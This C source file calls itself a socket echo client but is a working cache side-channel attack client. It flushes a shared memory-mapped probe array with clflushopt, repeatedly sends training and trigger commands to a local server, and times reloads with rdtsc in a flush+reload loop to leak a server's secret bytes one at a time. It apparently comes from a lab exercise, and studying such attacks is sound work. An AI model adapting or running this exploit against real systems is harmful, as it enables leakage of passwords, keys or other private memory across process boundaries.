/*
  C ECHO client example using sockets
*/
#include <stdio.h>  //printf
#include <string.h> //strlen
#include <sys/socket.h> //socket
#include <arpa/inet.h>  //inet_addr
#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <sys/mman.h>

#include <x86intrin.h> /* for rdtscp and clflush */

char *map = NULL;

#if 0
void flush_addr(char *addr) {
  _mm_clflush(addr);
}
#else
__attribute__ ((always_inline))
void flush_addr(char *p)
{
    asm volatile(
      "clflushopt (%0)\n"
      :: "r" (p)
    );
}
#endif

void flush_all() {
  unsigned long all_time[256];
  uint8_t *addr;
  int i, mix_i;
  for (i = 0; i < 256; i++) {
    addr = & map[i * 512];
    flush_addr(addr);
  }
  _mm_mfence();
}

__attribute__((always_inline))
unsigned long probe_addr(const char *adrs)
{
  volatile unsigned long time;

  asm __volatile__ (
    "mfence             \n"
    "lfence             \n"
    "rdtsc              \n"
    "lfence             \n"
    "movl %%eax, %%esi  \n"
    "movl (%1), %%eax   \n"
    "lfence             \n"
    "rdtsc              \n"
    "subl %%esi, %%eax  \n"
    //"clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  //printf("time = %lu\n", time);
  return time;
}

int counts[256];
void clear_counts() {
  memset(counts, 0, sizeof(counts));
}

char tochar(int idx) {
  // only ascii characters with values between [32,126]
  // are converted its corresponding character.
  // others are converted to '?'.
  if (idx < 32 || idx > 126) {
    return '?';
  }

  return (char) idx;
}

int tocounts(int idx) {
  if (idx == -1) {
    return -1;
  }

  return counts[idx];
}

void dump_result() {
  int highest_i = -1, second_highest_i = -1, i;
  for (i = 0; i < 256; i++) {
    if (counts[i] == 0) continue;

    if (highest_i == -1 || counts[i] > counts[highest_i]) {
      second_highest_i = highest_i;
      highest_i = i;
      continue;
    }

    if (second_highest_i == -1 || counts[i] > counts[second_highest_i]) {
      second_highest_i = i;
    }
  }
  printf("most hit char: %3d ('%c') - %3d hits;  second most hit char: %3d ('%c') - %3d hits\n",
          highest_i, tochar(highest_i), tocounts(highest_i),
          second_highest_i, tochar(second_highest_i), tocounts(second_highest_i));
}

void probe_all() {
  unsigned long all_time[256];
  uint8_t *addr;
  int i, mix_i;
  for (i = 0; i < 256; i++) {
    mix_i = ((i * 167) + 13) & 255;
    addr = & map[mix_i * 512];
    all_time[mix_i] = probe_addr(addr);
  }

  for (i = 0; i < 256; i++) {
    if (all_time[i] < 250) {
      //printf("[%d] at: %lu\n", i, all_time[i]);
      counts[i] += 1;
    }
  }
}

int sock = -1;
void send_cmd(char cmd, int count) {
  int i; 
  char buf[8];
  buf[0] = cmd;
  char server_reply[2000];

  for (i = 0; i < count; i++) {
    if( send(sock , buf , 1 , 0) < 0)
    {
      puts("Send failed");
      exit(1);
    }

    //Receive a reply from the server
    if( recv(sock , server_reply , 2000 , 0) < 0)
    {
      puts("recv failed");
      break;
    }
    // ignoring received message
  }
}

void leak_secret_byte() {
  int tries;
  clear_counts();
  for (tries = 999; tries > 0; tries--) {
    send_cmd('0', 50);
    flush_all();
    send_cmd('1', 1);
    probe_all();
  }
  dump_result();
}

int main(int argc , char *argv[])
{
  struct sockaddr_in server;
  char message[1000] , server_reply[2000];
  
  //Create socket
  sock = socket(AF_INET , SOCK_STREAM , 0);
  if (sock == -1)
  {
    printf("Could not create socket");
  }
  puts("Socket created");
  
  server.sin_addr.s_addr = inet_addr("127.0.0.1");
  server.sin_family = AF_INET;
  server.sin_port = htons( 8888 );

  //Connect to remote server
  if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
  {
    perror("connect failed. Error");
    return 1;
  }
  
  puts("Connected\n");

  // open shared file
  int fd = open("shared_file", O_RDWR);
  map = mmap((void*)0x12300000UL, 0x20000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  char buf[32] = {'\0'};
  strncpy(buf, map, 16);
  //printf("BUF=%s\n", buf);

  int i;
  for (i = 0; i < 7; i++) {
    leak_secret_byte();

    // move to next char at server
    send_cmd('+', 1);
  }
  
  close(sock);
  return 0;
}
